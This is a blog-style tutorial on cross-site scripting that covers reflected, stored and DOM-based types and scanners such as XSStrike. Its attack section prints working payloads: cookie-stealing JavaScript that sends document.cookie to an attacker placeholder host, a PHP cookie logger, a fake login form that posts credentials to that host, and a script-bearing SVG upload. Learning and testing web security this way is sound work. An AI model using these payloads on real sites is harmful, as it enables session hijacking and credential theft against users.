---
layout: post
title: "XSS Overview"
---

Check XSS CheatSheet for more (comming soon)

------------

# Overview

![XSS](/docs/assets/img/XSS-Overview/XSS.PNG)

What about [same-origin policy](https://portswigger.net/web-security/cors/same-origin-policy) (SOP), huh?

But what if there was a way around that?

Having access to JavaScript on another website in a context of different user can be quite problematic. So... Is there a way to inject code into another website?

That is where today`s topic comes in. 

Cross-Site Scripting (XSS) attacks are a type of injection vulnerabilities that take advantage of a flaw in user input sanitization to inject malicious code into the page and execute it on the client side, leading to several types of attacks.

# Types

There are three main types of XSS vulnerabilities:

* Reflected (Non-Persistent) XSS occurs when user input is immediately returned to the page after being processed by the backend server (e.g., search result or error message), without permanently storing the user provided data.

| <!-- -->    | <!-- -->    |
|-------------|-------------|
![Reflected1](/docs/assets/img/XSS-Overview/Reflected1.PNG)  |  ![Reflected2](/docs/assets/img/XSS-Overview/Reflected2.PNG)

* Stored (Persistent) XSS is the most critical type of XSS. It occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments).

![Stored](/docs/assets/img/XSS-Overview/Stored.PNG)

* DOM-based XSS, last another Non-Persistent XSS type that occurs when JavaScript is used to change the page source through the Document Object Model (DOM) - user input is completely processed on the client-side, without reaching the back-end server and is shown in the browser (e.g., through client-side HTTP parameters or anchor tags).

# XSS Discovery

## Automated Discovery

Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [ZAP](https://www.zaproxy.org/), and much more) are capable of detecting all above mentioned types of XSS vulnerabilities. Usually by sending various payloads in an attempt to trigger Reflected or Stored XSS or by review of client=side code for potential DOM-based vulnerabilities.

For targeted XSS discovery there are many open-source tools, my favourite, [XSStrike](https://github.com/s0md3v/XSStrike), and others like [XSS-Scanner](https://github.com/MariaGarber/XSS-Scanner), or [XSSer](https://github.com/epsylon/xsser) 

```powershell
python xsstrike.py -u "http://VICTIM_IP:PORT/index.php?task=test" 
```

Keep in mind that none of the mentioned tools are foolproof and all discoveries needs to be verified.

## Manual Discovery

While I usually prefer manual exploitation there are exceptions, and XSS is one of them.
Manual discovery of XSS vulnerabilities is not hard but it is just plainly inefficient as it means manually testing various XSS payloads against an input field in a given web page.
There are enormous lists of XSS payloads, like [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) and automated tools just faster than you.

While basic XSS vulnerabilities can usually be found by testing various payloads, i.e. Automated discovery tools, in reality there will rarely be anything to find. Developers most likely ran some vulnerability scan before publishing and caught all the low hanging fruit.

Where manual discovery comes in is Code Review.
If we know exactly how user input is handled we can create custom payload that will do what we need it to.

# Attack examples

## Blind XSS

Normally we try to discover if and where an XSS vulnerability exists. But what if we can not easily see the result of out injection?

A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

Therefore, they are much more difficult to detect than other types of XSS flaws.
Simple web vulnerability scanners that only analyze direct responses from the application are unable to detect them.

It usually occurs with forms only accessible by certain users (Admins).

* Contact Forms
* User Details
* Support Tickets
....and more

To detect them, we can use a JavaScript payload that sends an HTTP request back to our server.

```powershell
sudo php -S 0.0.0.0:80
```

If the code gets executed, we will get a response on listener running on our machine, and we will know that the page is vulnerable.

### Remote Scripts

In HTML, we can write JavaScript code within the `<script>` tags, but we can also include a remote script by providing its URL.

```html
<script src="http://OUR_IP/script.js"></script>
```

We can use this to execute a remote JavaScript file.

If we have multiple input fields we can change the requested script name from script.js to the name of the input field (e.g. `username.js`) so we can identify the vulnerable input field that executed the script.

With that, we can start testing different XSS payloads that load a remote script and see which of them sends us a request.


## Session Hijacking
 
How would you feel if someone stole your cookie?

This attack aims to grab the session cookie and send it to us so we could log in as, hopefully, administrator.

It requires a payload to send us the required data and a PHP script hosted on our machine to grab transmitted data.

```php
<?php
if(!empty($_GET['cookie'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_GET['cookie']);
    fclose($logfile);
}
?>
```

There are multiple JavaScript payloads we can use to grab the session cookie, few examples from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md):

```JavaScript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Put selected payload into `payload.js` and host in on your machine to be used as Remote Script.

```html
<script src=http://OUR_IP/payload.js></script>
```

Once our XSS payload is triggered, we will receive two requests, one for payload.js, and another request with the cookie value.

We can use this cookie on the login page to access the victim's account.

## Phishing and Credential Theft

In a phishing XSS attack, you create fake login forms and steal credentials.

```html
<h1>Please login to continue</h1>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Payload:
```JavaScript
<script>
document.write('<h1>Please login to continue</h1><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
</script>
```

The malicious code is embedded in a link that is sent to the victim.
When the victim clicks on the link, they will see our fake login form.

So be careful, especially with shortened urls, like [TinyURL](https://tinyurl.com/) and others.

## File Upload

Stored XSS via File upload

```html
<?xml version="1.0" encoding="utf-8"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <circle cx='100' cy='100' r='100' />
  <script type="text/javascript">
    alert("XSS");
  </script>
</svg>
```

~
